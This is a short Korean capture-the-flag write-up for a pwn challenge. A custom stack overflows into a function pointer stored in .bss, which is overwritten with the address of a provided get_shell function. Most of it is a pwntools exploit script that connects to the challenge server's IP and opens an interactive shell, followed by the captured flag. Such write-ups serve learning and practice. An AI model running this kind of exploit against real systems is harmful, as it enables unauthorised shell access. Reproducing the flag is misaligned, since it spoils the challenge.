stack을 직접 구현해놨다. main 뒤쪽에 `func()` 이 있는데, 이것은 bss 영역에 있었다. 또한 스택을 11번 채우면 변조할 수 있는 변수이기도 하다. get_shell 함수를 친절하게 주었으므로, 그대로 변조하여 쉘을 받아낸다.

# Exploit code

```python
from pwn import *
from time import *
from tqdm import *

p = remote('44.210.9.208', 10013)

get_shell = 0x4012F2

for i in tqdm(range(10)):
    p.sendlineafter(b'> ', b'1')
    sleep(0.3)
    p.sendline(b'a')
    sleep(0.3)

p.sendlineafter(b'> ', b'1')
sleep(0.3)
p.sendline(p64(get_shell))
sleep(0.3)
p.sendlineafter(b'> ', b'4')
p.interactive()
```
`scpCTF{TYr64HK4QhV8PzRcPFlqolsBHX6sXU}`